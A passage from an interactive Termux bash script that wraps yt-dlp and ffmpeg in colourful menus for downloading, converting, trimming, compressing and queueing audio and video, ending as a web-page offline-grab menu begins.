                    printf "  ${C2}%3d.${RESET} %-40s ${FADE}%s · %s${RESET}\n" "$((i+1))" "$(basename "$af")" "${br:-?}" "${afmt:-?}"
                done
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            15)
                echo ""
                printf "  ${C2}[*] Audio files in vault:${RESET}\n\n"
                mapfile -t cfiles < <(find "$MUSICDIR" "$DLDIR" -maxdepth 2 -type f \( -name "*.mp3" -o -name "*.flac" -o -name "*.ogg" -o -name "*.m4a" -o -name "*.wav" -o -name "*.opus" \) 2>/dev/null | sort | head -30)
                if [[ ${#cfiles[@]} -eq 0 ]]; then printf "  ${FADE}No audio files found${RESET}\n"; sleep 1; continue; fi
                for i in "${!cfiles[@]}"; do
                    printf "  ${C2}%3d.${RESET} %s\n" "$((i+1))" "$(basename "${cfiles[$i]}")"
                done
                echo ""
                printf "  ${WH}Number to convert: ${RESET}"; read -r cnum
                local cidx=$(( cnum - 1 ))
                [[ -z "${cfiles[$cidx]}" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 0.7; continue; }
                echo ""
                printf "  ${WH}Output format [mp3/flac/ogg/m4a/wav]: ${RESET}"; read -r cfmt
                [[ -z "$cfmt" ]] && continue
                local csrc="${cfiles[$cidx]}"
                local cout="$MUSICDIR/$(basename "${csrc%.*}").$cfmt"
                printf "  ${C2}[*] Converting to %s...${RESET}\n\n" "$cfmt"
                ffmpeg -i "$csrc" -q:a 0 "$cout" -y 2>/dev/null \
                    && printf "  ${GRN}✓ Saved: %s${RESET}\n" "$cout" \
                    || printf "  ${RED}Conversion failed — check ffmpeg${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                local _mq=()
                while true; do
                    clear; echo ""
                    _dv2
                    printf "  ${C2}${BOLD}MUSIC SEARCH & QUEUE  ·  SOI · 999${RESET}\n"
                    _dv2; echo ""
                    if [[ ${#_mq[@]} -gt 0 ]]; then
                        printf "  ${C2}Queue (%d track(s)):${RESET}\n" "${#_mq[@]}"
                        for _mqi in "${!_mq[@]}"; do
                            local _mqe="${_mq[$_mqi]}"
                            printf "  ${FADE}  %d. %s [%s]${RESET}\n" "$((_mqi+1))" "${_mqe%%|||*}" "${_mqe##*|||}"
                        done
                        echo ""
                    fi
                    printf "  ${WH}[S] Search    [D] Download queue    [C] Clear queue    [B] Back${RESET}\n\n"
                    printf "  ${C2}Choice » ${RESET}"; read -r _mqch
                    case "$_mqch" in
                        S|s)
                            echo ""; printf "  ${WH}Search query: ${RESET}"; read -r _mqsq
                            [[ -z "$_mqsq" ]] && continue
                            echo ""
                            printf "  ${C2}[*] Searching YouTube Music...${RESET}\n\n"
                            mapfile -t _mqres < <(yt-dlp "ytsearch10:$_mqsq" --print "%(title)s — %(uploader)s [%(duration_string)s]" --skip-download 2>/dev/null)
                            if [[ ${#_mqres[@]} -eq 0 ]]; then
                                printf "  ${RED}No results found${RESET}\n"; sleep 1; continue
                            fi
                            for _mri in "${!_mqres[@]}"; do
                                printf "  ${C2}%2d.${RESET}  ${WH}%s${RESET}\n" "$((_mri+1))" "${_mqres[$_mri]}"
                            done
                            echo ""
                            printf "  ${WH}Pick number (1-%d): ${RESET}" "${#_mqres[@]}"; read -r _mrpick
                            [[ -z "$_mrpick" || ! "$_mrpick" =~ ^[0-9]+$ ]] && continue
                            (( _mrpick < 1 || _mrpick > ${#_mqres[@]} )) && continue
                            echo ""
                            printf "  ${WH}Format: [1] mp3  [2] flac  [3] ogg  [4] m4a  [5] opus${RESET}\n"
                            printf "  ${C2}Format » ${RESET}"; read -r _mrfmt
                            case "$_mrfmt" in
                                1) _mrfmt="mp3"  ;;
                                2) _mrfmt="flac" ;;
                                3) _mrfmt="ogg"  ;;
                                4) _mrfmt="m4a"  ;;
                                5) _mrfmt="opus" ;;
                                *) _mrfmt="mp3"  ;;
                            esac
                            _mq+=("${_mqres[$((_mrpick-1))]}|||$_mqsq|||$_mrpick|||$_mrfmt")
                            printf "  ${GRN}✓ Added: %s [%s]${RESET}\n" "${_mqres[$((_mrpick-1))]}" "$_mrfmt"
                            sleep 0.8 ;;
                        D|d)
                            [[ ${#_mq[@]} -eq 0 ]] && { printf "  ${RED}Queue is empty${RESET}\n"; sleep 1; continue; }
                            echo ""
                            printf "  ${C2}[*] Downloading %d track(s)...${RESET}\n\n" "${#_mq[@]}"
                            for _mqde in "${_mq[@]}"; do
                                local _mqtitle="${_mqde%%|||*}"
                                local _mqparts="${_mqde#*|||}"
                                local _mqsrch="${_mqparts%%|||*}"
                                local _mqparts2="${_mqparts#*|||}"
                                local _mqidx="${_mqparts2%%|||*}"
                                local _mqfmt="${_mqparts2#*|||}"
                                printf "  ${C2}→${RESET} %s [%s]\n" "$_mqtitle" "$_mqfmt"
                                yt-dlp "ytsearch10:$_mqsrch" -x --audio-format "$_mqfmt" --embed-thumbnail --add-metadata --playlist-items "$_mqidx" -o "$MUSICDIR/%(title)s.%(ext)s" 2>/dev/null
                            done
                            _mq=()
                            echo ""; printf "  ${GRN}✓ Queue done — check $MUSICDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        C|c)
                            _mq=()
                            printf "  ${GRN}✓ Queue cleared${RESET}\n"; sleep 0.7 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;
            z|Z)
                echo ""
                printf "  ${C2}[INSTALL]${RESET} ${WH}Music portal packages${RESET}\n\n"
                pkg install yt-dlp ffmpeg mpv -y
                printf "\n  ${GRN}✓ yt-dlp, ffmpeg, mpv installed${RESET}\n"
                printf "  ${WH}Termux-YT-DLG: git clone https://github.com/Rims-Naps/Termux-YT-DLG.git ~/Termux-YT-DLG${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [3] VIDEO PORTAL
# ═══════════════════════════════════════════════════════════════════

video_portal() {
    while true; do
        clear
        _portal_entry "Video Portal" "${C3}"
        echo ""
        _dv3
        printf "  ${C3}${BOLD}VIDEO PORTAL  —  HQ Merge · TikTok · Instagram · Twitter  ${RESET}\n"
        _dv3
        echo ""
        printf "  ${WH}yt-dlp · ffmpeg · HQ merge · ~/storage/downloads${RESET}\n"
        printf "  ${FADE}■ 1000 sites and not one of them saw us land · Sasuke stealth · zero trace · HQ every pull${RESET}\n"
        echo ""
        _dv3
        echo ""
        printf "  ${WH}[1] Paste URL — best quality video, auto selected                   ${RESET}\n"
        printf "  ${WH}[2] Playlist — every video, one pull                                ${RESET}\n"
        printf "  ${WH}[3] Custom format — list all options, pick one                      ${RESET}\n"
        printf "  ${WH}[4] Thumbnail only — image artwork, no video file                   ${RESET}\n"
        printf "  ${WH}[5] TikTok — paste TikTok link direct                               ${RESET}\n"
        printf "  ${WH}[6] Twitter / X — video from any tweet                              ${RESET}\n"
        printf "  ${WH}[7] Instagram — reel, post or story                                 ${RESET}\n"
        printf "  ${WH}[8] Batch file — multiple URLs, one operation                       ${RESET}\n"
        printf "  ${C3}[9] Format Presets — 4K / 1080p / 720p / audio-only               ${RESET}\n"
        printf "  ${C3}[10] Cookies Manager — view / import / clear cookies.txt           ${RESET}\n"
        printf "  ${C3}[11] Download History — list all videos in $DLDIR              ${RESET}\n"
        printf "  ${C3}[12] Search & Queue — search · pick · choose format · queue · dl  ${RESET}\n"
        echo ""
        printf "  ${C3}${BOLD}── ADVANCED VIDEO TOOLS ───────────────────────────────────────${RESET}\n"
        printf "  ${WH}[13] Format Converter — convert video to MP4/MKV/AVI/WEBM        ${RESET}\n"
        printf "  ${WH}[14] Subtitle Downloader — auto-download subs from URL           ${RESET}\n"
        printf "  ${WH}[15] Video Trimmer — cut/trim video by timestamp                 ${RESET}\n"
        printf "  ${WH}[16] Compress Video — reduce file size (maintain quality)        ${RESET}\n"
        printf "  ${WH}[17] Extract Audio — rip audio track to MP3/M4A/OGG              ${RESET}\n"
        printf "  ${WH}[18] Merge Videos — combine multiple videos into one             ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv3
        echo ""
        _hover_hint "video"
        echo ""
        printf "  ${C3}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C3}[*] Fetching video info...${RESET}\n\n"
                yt-dlp --print "Title: %(title)s\nUploader: %(uploader)s\nDuration: %(duration_string)s\nResolution: %(resolution)s\nSize: %(filesize_approx)s bytes" --skip-download "$url" 2>/dev/null | head -5
                echo ""
                printf "  ${WH}Download this video? [y/n]: ${RESET}"; read -r confirm
                [[ "$confirm" != "y" && "$confirm" != "Y" ]] && continue
                echo ""
                printf "  ${C3}[*] Downloading video (best quality)...${RESET}\n\n"
                yt-dlp -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best" --merge-output-format mp4 -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done — check $DLDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Playlist URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C3}[*] Analyzing playlist...${RESET}\n\n"
                local playlist_count=$(yt-dlp --flat-playlist --print "%(playlist_count)s" "$url" 2>/dev/null | head -1)
                printf "  ${WH}Playlist contains: %s videos${RESET}\n" "${playlist_count:-unknown}"
                echo ""
                printf "  ${WH}Download entire playlist? [y/n]: ${RESET}"; read -r confirm
                [[ "$confirm" != "y" && "$confirm" != "Y" ]] && continue
                echo ""
                printf "  ${C3}[*] Downloading playlist...${RESET}\n\n"
                yt-dlp -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best" --merge-output-format mp4 -o "$DLDIR/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Playlist complete${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C3}[*] Listing available formats...${RESET}\n\n"
                yt-dlp -F "$url"
                echo ""
                printf "  ${WH}Format ID to download: ${RESET}"; read -r fmt
                [[ -z "$fmt" ]] && continue
                echo ""
                printf "  ${C3}[*] Downloading format %s...${RESET}\n\n" "$fmt"
                yt-dlp -f "$fmt" -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C3}[*] Downloading thumbnail only...${RESET}\n\n"
                yt-dlp --write-thumbnail --skip-download -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Thumbnail saved${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}TikTok URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C3}[*] TikTok download...${RESET}\n\n"
                yt-dlp -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""; printf "  ${WH}Twitter/X URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C3}[*] Twitter/X video download...${RESET}\n\n"
                yt-dlp -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Instagram URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C3}[*] Instagram download (requires cookies.txt)...${RESET}\n\n"
                yt-dlp --cookies "$COOKIES_FILE" -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Paste URLs (one per line, Ctrl+D when done):${RESET}\n"
                while IFS= read -r url; do
                    [[ -z "$url" ]] && continue
                    printf "  ${C3}→${RESET} %s\n" "$url"
                    yt-dlp -f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best" --merge-output-format mp4 -o "$DLDIR/%(title)s.%(ext)s" "$url"
                done 2>/dev/null
                echo ""; printf "  ${GRN}✓ All downloads complete${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                printf "  ${C3}Format Presets:${RESET}\n\n"
                printf "  ${WH}[1] 4K (2160p)     — best video + audio, max quality${RESET}\n"
                printf "  ${WH}[2] 1080p Full HD  — best 1080p available${RESET}\n"
                printf "  ${WH}[3] 720p HD        — lighter, good quality${RESET}\n"
                printf "  ${WH}[4] Audio only MP3 — strip video, extract audio${RESET}\n"
                printf "  ${WH}[5] Audio only M4A — AAC format, smaller file${RESET}\n"
                echo ""; printf "  ${WH}Preset [1-5]: ${RESET}"; read -r preset
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                case "$preset" in
                    1) printf "  ${C3}[*] 4K download...${RESET}\n\n"
                       yt-dlp -f "bestvideo[height<=2160][ext=mp4]+bestaudio/best" --merge-output-format mp4 -o "$DLDIR/%(title)s.%(ext)s" "$url" ;;
                    2) printf "  ${C3}[*] 1080p download...${RESET}\n\n"
                       yt-dlp -f "bestvideo[height<=1080][ext=mp4]+bestaudio/best" --merge-output-format mp4 -o "$DLDIR/%(title)s.%(ext)s" "$url" ;;
                    3) printf "  ${C3}[*] 720p download...${RESET}\n\n"
                       yt-dlp -f "bestvideo[height<=720][ext=mp4]+bestaudio/best" --merge-output-format mp4 -o "$DLDIR/%(title)s.%(ext)s" "$url" ;;
                    4) printf "  ${C3}[*] Audio only MP3...${RESET}\n\n"
                       yt-dlp -x --audio-format mp3 --embed-thumbnail -o "$DLDIR/%(title)s.%(ext)s" "$url" ;;
                    5) printf "  ${C3}[*] Audio only M4A...${RESET}\n\n"
                       yt-dlp -x --audio-format m4a -o "$DLDIR/%(title)s.%(ext)s" "$url" ;;
                    *) printf "  ${RED}Invalid preset${RESET}\n"; sleep 0.7; continue ;;
                esac
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                printf "  ${C3}Cookies Manager:${RESET}\n\n"
                printf "  ${WH}[1] View current cookies.txt (first 20 lines)${RESET}\n"
                printf "  ${WH}[2] Import cookies from /sdcard/Download/cookies.txt${RESET}\n"
                printf "  ${WH}[3] Clear cookies.txt${RESET}\n"
                printf "  ${WH}[4] Check cookie count${RESET}\n"
                echo ""; printf "  ${WH}Choice: ${RESET}"; read -r ck
                echo ""
                case "$ck" in
                    1) head -20 "$COOKIES_FILE" 2>/dev/null || printf "  ${FADE}cookies.txt empty or not found${RESET}\n" ;;
                    2) if [[ -f "$WATCH_DIR/cookies.txt" ]]; then
                           cp "$WATCH_DIR/cookies.txt" "$COOKIES_FILE"
                           printf "  ${GRN}✓ Imported from %s${RESET}\n" "$WATCH_DIR"
                       else
                           printf "  ${RED}No cookies.txt found in %s${RESET}\n" "$WATCH_DIR"
                       fi ;;
                    3) > "$COOKIES_FILE"; printf "  ${GRN}✓ cookies.txt cleared${RESET}\n" ;;
                    4) local cnt; cnt=$(grep -c "." "$COOKIES_FILE" 2>/dev/null || echo 0)
                       printf "  ${WH}Cookie lines: %s${RESET}\n" "$cnt" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                printf "  ${C3}[*] Download History:${RESET}\n\n"
                local vcount; vcount=$(find "$DLDIR" -maxdepth 1 -type f \( -name "*.mp4" -o -name "*.mkv" -o -name "*.webm" \) 2>/dev/null | wc -l)
                printf "  ${WH}Total videos: %s${RESET}\n\n" "$vcount"
                find "$DLDIR" -maxdepth 1 -type f \( -name "*.mp4" -o -name "*.mkv" -o -name "*.webm" \) -printf '%T@ %f\n' 2>/dev/null | sort -rn | head -15 | awk '{print $2}' | nl -w2 -s". "
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                local _vq=()
                while true; do
                    clear; echo ""
                    _dv3
                    printf "  ${C3}${BOLD}VIDEO SEARCH & QUEUE  ·  SOI · 999${RESET}\n"
                    _dv3; echo ""
                    if [[ ${#_vq[@]} -gt 0 ]]; then
                        printf "  ${C3}Queue (%d video(s)):${RESET}\n" "${#_vq[@]}"
                        for _vqi in "${!_vq[@]}"; do
                            local _vqe="${_vq[$_vqi]}"
                            printf "  ${FADE}  %d. %s [%s]${RESET}\n" "$((_vqi+1))" "${_vqe%%|||*}" "${_vqe##*|||}"
                        done
                        echo ""
                    fi
                    printf "  ${WH}[S] Search    [D] Download queue    [C] Clear queue    [B] Back${RESET}\n\n"
                    printf "  ${C3}Choice » ${RESET}"; read -r _vqch
                    case "$_vqch" in
                        S|s)
                            echo ""; printf "  ${WH}Search query: ${RESET}"; read -r _vqsq
                            [[ -z "$_vqsq" ]] && continue
                            echo ""
                            printf "  ${C3}[*] Searching YouTube...${RESET}\n\n"
                            mapfile -t _vqres < <(yt-dlp "ytsearch10:$_vqsq" --print "%(title)s — %(uploader)s [%(duration_string)s]" --skip-download 2>/dev/null)
                            if [[ ${#_vqres[@]} -eq 0 ]]; then
                                printf "  ${RED}No results found${RESET}\n"; sleep 1; continue
                            fi
                            for _vri in "${!_vqres[@]}"; do
                                printf "  ${C3}%2d.${RESET}  ${WH}%s${RESET}\n" "$((_vri+1))" "${_vqres[$_vri]}"
                            done
                            echo ""
                            printf "  ${WH}Pick number (1-%d): ${RESET}" "${#_vqres[@]}"; read -r _vrpick
                            [[ -z "$_vrpick" || ! "$_vrpick" =~ ^[0-9]+$ ]] && continue
                            (( _vrpick < 1 || _vrpick > ${#_vqres[@]} )) && continue
                            echo ""
                            printf "  ${WH}Format: [1] 4K  [2] 1080p  [3] 720p  [4] 480p  [5] audio-mp3${RESET}\n"
                            printf "  ${C3}Format » ${RESET}"; read -r _vrfmt
                            local _vrfmtstr _vrfmtlabel
                            case "$_vrfmt" in
                                1) _vrfmtstr="bestvideo[height<=2160][ext=mp4]+bestaudio/best"; _vrfmtlabel="4K"      ;;
                                2) _vrfmtstr="bestvideo[height<=1080][ext=mp4]+bestaudio/best"; _vrfmtlabel="1080p"   ;;
                                3) _vrfmtstr="bestvideo[height<=720][ext=mp4]+bestaudio/best";  _vrfmtlabel="720p"    ;;
                                4) _vrfmtstr="bestvideo[height<=480][ext=mp4]+bestaudio/best";  _vrfmtlabel="480p"    ;;
                                5) _vrfmtstr="audio-mp3"; _vrfmtlabel="audio-mp3" ;;
                                *) _vrfmtstr="bestvideo[ext=mp4]+bestaudio/best";               _vrfmtlabel="best"    ;;
                            esac
                            _vq+=("${_vqres[$((_vrpick-1))]}|||$_vqsq|||$_vrpick|||$_vrfmtstr|||$_vrfmtlabel")
                            printf "  ${GRN}✓ Added: %s [%s]${RESET}\n" "${_vqres[$((_vrpick-1))]}" "$_vrfmtlabel"
                            sleep 0.8 ;;
                        D|d)
                            [[ ${#_vq[@]} -eq 0 ]] && { printf "  ${RED}Queue is empty${RESET}\n"; sleep 1; continue; }
                            echo ""
                            printf "  ${C3}[*] Downloading %d video(s)...${RESET}\n\n" "${#_vq[@]}"
                            for _vqde in "${_vq[@]}"; do
                                local _vqtitle="${_vqde%%|||*}"
                                local _vqp1="${_vqde#*|||}"
                                local _vqsrch="${_vqp1%%|||*}"
                                local _vqp2="${_vqp1#*|||}"
                                local _vqidx="${_vqp2%%|||*}"
                                local _vqp3="${_vqp2#*|||}"
                                local _vqfmtstr="${_vqp3%%|||*}"
                                local _vqlabel="${_vqp3#*|||}"
                                printf "  ${C3}→${RESET} %s [%s]\n" "$_vqtitle" "$_vqlabel"
                                if [[ "$_vqfmtstr" == "audio-mp3" ]]; then
                                    yt-dlp "ytsearch10:$_vqsrch" -x --audio-format mp3 --embed-thumbnail --playlist-items "$_vqidx" -o "$VIDDIR/%(title)s.%(ext)s" 2>/dev/null
                                else
                                    yt-dlp "ytsearch10:$_vqsrch" -f "$_vqfmtstr" --merge-output-format mp4 --playlist-items "$_vqidx" -o "$VIDDIR/%(title)s.%(ext)s" 2>/dev/null
                                fi
                            done
                            _vq=()
                            echo ""; printf "  ${GRN}✓ Queue done — check $VIDDIR${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        C|c)
                            _vq=()
                            printf "  ${GRN}✓ Queue cleared${RESET}\n"; sleep 0.7 ;;
                        B|b) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;
            13)
                echo ""; printf "  ${WH}Video file to convert: ${RESET}"; read -r vfile
                [[ -z "$vfile" || ! -f "$vfile" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${WH}Output format: [1] MP4  [2] MKV  [3] AVI  [4] WEBM: ${RESET}"; read -r vconv
                local vext vcodec
                case "$vconv" in
                    1) vext="mp4"; vcodec="libx264" ;;
                    2) vext="mkv"; vcodec="libx264" ;;
                    3) vext="avi"; vcodec="libxvid" ;;
                    4) vext="webm"; vcodec="libvpx" ;;
                    *) printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue ;;
                esac
                local vout="${vfile%.*}_converted.$vext"
                echo ""
                printf "  ${C3}[*] Converting to $vext...${RESET}\n\n"
                ffmpeg -i "$vfile" -c:v "$vcodec" -c:a aac "$vout" 2>&1 | tail -5
                [[ -f "$vout" ]] && printf "\n  ${GRN}✓ Saved: %s${RESET}\n" "$vout" || printf "  ${RED}Conversion failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14)
                echo ""; printf "  ${WH}Video URL for subtitle download: ${RESET}"; read -r suburl
                [[ -z "$suburl" ]] && continue
                echo ""
                printf "  ${C3}[*] Downloading subtitles...${RESET}\n\n"
                yt-dlp --write-subs --write-auto-subs --sub-lang en --skip-download -o "$DLDIR/%(title)s" "$suburl"
                echo ""; printf "  ${GRN}✓ Subtitles saved to $DLDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            15)
                echo ""; printf "  ${WH}Video file to trim: ${RESET}"; read -r trimfile
                [[ -z "$trimfile" || ! -f "$trimfile" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${WH}Start time (HH:MM:SS or seconds): ${RESET}"; read -r tstart
                printf "  ${WH}Duration (HH:MM:SS or seconds): ${RESET}"; read -r tdur
                [[ -z "$tstart" || -z "$tdur" ]] && continue
                local trimout="${trimfile%.*}_trimmed.${trimfile##*.}"
                echo ""
                printf "  ${C3}[*] Trimming video...${RESET}\n\n"
                ffmpeg -i "$trimfile" -ss "$tstart" -t "$tdur" -c copy "$trimout" 2>&1 | tail -5
                [[ -f "$trimout" ]] && printf "\n  ${GRN}✓ Saved: %s${RESET}\n" "$trimout" || printf "  ${RED}Trim failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                echo ""; printf "  ${WH}Video file to compress: ${RESET}"; read -r compfile
                [[ -z "$compfile" || ! -f "$compfile" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${WH}Quality: [1] High (CRF 23)  [2] Medium (CRF 28)  [3] Low (CRF 32): ${RESET}"; read -r crf_ch
                local crf_val
                case "$crf_ch" in
                    1) crf_val=23 ;;
                    2) crf_val=28 ;;
                    3) crf_val=32 ;;
                    *) crf_val=23 ;;
                esac
                local compout="${compfile%.*}_compressed.mp4"
                echo ""
                printf "  ${C3}[*] Compressing with CRF %s...${RESET}\n\n" "$crf_val"
                ffmpeg -i "$compfile" -c:v libx264 -crf "$crf_val" -c:a aac "$compout" 2>&1 | tail -5
                if [[ -f "$compout" ]]; then
                    local orig_size comp_size
                    orig_size=$(du -h "$compfile" | awk '{print $1}')
                    comp_size=$(du -h "$compout" | awk '{print $1}')
                    printf "\n  ${GRN}✓ Original: %s → Compressed: %s${RESET}\n" "$orig_size" "$comp_size"
                    printf "  ${WH}Saved: %s${RESET}\n" "$compout"
                else
                    printf "  ${RED}Compression failed${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            17)
                echo ""; printf "  ${WH}Video file for audio extraction: ${RESET}"; read -r audfile
                [[ -z "$audfile" || ! -f "$audfile" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${WH}Audio format: [1] MP3  [2] M4A  [3] OGG: ${RESET}"; read -r aud_fmt
                local aud_ext aud_codec
                case "$aud_fmt" in
                    1) aud_ext="mp3"; aud_codec="libmp3lame" ;;
                    2) aud_ext="m4a"; aud_codec="aac" ;;
                    3) aud_ext="ogg"; aud_codec="libvorbis" ;;
                    *) aud_ext="mp3"; aud_codec="libmp3lame" ;;
                esac
                local audout="${audfile%.*}.$aud_ext"
                echo ""
                printf "  ${C3}[*] Extracting audio as %s...${RESET}\n\n" "$aud_ext"
                ffmpeg -i "$audfile" -vn -c:a "$aud_codec" "$audout" 2>&1 | tail -5
                [[ -f "$audout" ]] && printf "\n  ${GRN}✓ Saved: %s${RESET}\n" "$audout" || printf "  ${RED}Extraction failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            18)
                echo ""
                printf "  ${C3}VIDEO MERGER${RESET}\n\n"
                printf "  ${WH}Create a file list with one video path per line, then run:${RESET}\n"
                printf "  ${FADE}ffmpeg -f concat -safe 0 -i list.txt -c copy output.mp4${RESET}\n\n"
                printf "  ${WH}[Q] Quick merge 2 videos  [A] Advanced (use file list)  [B] Back: ${RESET}"; read -r merge_ch
                case "${merge_ch^^}" in
                    Q)
                        echo ""; printf "  ${WH}First video: ${RESET}"; read -r v1
                        printf "  ${WH}Second video: ${RESET}"; read -r v2
                        [[ ! -f "$v1" || ! -f "$v2" ]] && { printf "  ${RED}Files not found${RESET}\n"; sleep 1; continue; }
                        local merge_out="$DLDIR/merged_$(date +%Y%m%d_%H%M%S).mp4"
                        local merge_list="${TMPDIR:-/tmp}/merge_list_$$.txt"
                        echo "file '$v1'" > "$merge_list"
                        echo "file '$v2'" >> "$merge_list"
                        echo ""
                        printf "  ${C3}[*] Merging videos...${RESET}\n\n"
                        ffmpeg -f concat -safe 0 -i "$merge_list" -c copy "$merge_out" 2>&1 | tail -5
                        rm -f "$merge_list"
                        [[ -f "$merge_out" ]] && printf "\n  ${GRN}✓ Merged: %s${RESET}\n" "$merge_out" || printf "  ${RED}Merge failed${RESET}\n" ;;
                    A)
                        echo ""
                        printf "  ${WH}Path to file list (one video per line): ${RESET}"; read -r flist
                        [[ ! -f "$flist" ]] && { printf "  ${RED}List not found${RESET}\n"; sleep 1; continue; }
                        local adv_out="$DLDIR/merged_$(date +%Y%m%d_%H%M%S).mp4"
                        echo ""
                        printf "  ${C3}[*] Merging videos from list...${RESET}\n\n"
                        ffmpeg -f concat -safe 0 -i "$flist" -c copy "$adv_out" 2>&1 | tail -5
                        [[ -f "$adv_out" ]] && printf "\n  ${GRN}✓ Merged: %s${RESET}\n" "$adv_out" || printf "  ${RED}Merge failed${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [4] WEB OFFLINE GRAB
# ═══════════════════════════════════════════════════════════════════

webgrab_portal() {
    while true; do
        clear
        _portal_entry "Web Grab" "${C4}"
        echo ""
        _dv4
        printf "  ${C4}${BOLD}WEB OFFLINE GRAB  —  Freeze The Internet · Monolith  ${RESET}\n"
        _dv4
        echo ""
        printf "  ${WH}wget · monolith · /sdcard/Download/webgrab/[domain]${RESET}\n"
        printf "  ${FADE}■ Froze the whole internet into the stash · Pink Tape playing offline forever · no wifi needed${RESET}\n"
        echo ""
        _dv4
        echo ""
        printf "  ${WH}[1] Nano — text only, fast and clean (HTML only)                    ${RESET}\n"
        printf "  ${WH}[2] Minimal — full visual with CSS and images                       ${RESET}\n"
        printf "  ${WH}[3] Full Mirror — entire site every page (use on small sites)       ${RESET}\n"
        printf "  ${WH}[4] Single Page — one page saved complete                           ${RESET}\n"
        printf "  ${WH}[5] Monolith ★ — SINGLE HTML file with everything embedded          ${RESET}\n"
        printf "  ${WH}[6] Install monolith — requires rust + cargo                        ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv4
        echo ""
        _hover_hint "webgrab"
        echo ""
        printf "  ${C4}${BOLD}Choice » ${RESET}"
        read -r ch
